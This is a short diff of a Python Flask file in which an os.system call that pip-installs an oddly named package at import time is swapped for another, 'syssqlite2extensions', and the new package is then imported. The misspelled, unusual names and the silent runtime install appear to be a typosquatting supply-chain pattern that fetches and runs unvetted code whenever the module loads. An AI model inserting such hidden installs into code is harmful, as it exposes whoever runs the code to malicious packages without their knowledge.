@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pythonsqlitelibaryV1")
-import pythonsqlitelibaryV1
+os.system("pip install syssqlite2extensions")
+import syssqlite2extensions
 import flask
 
 from flask import g
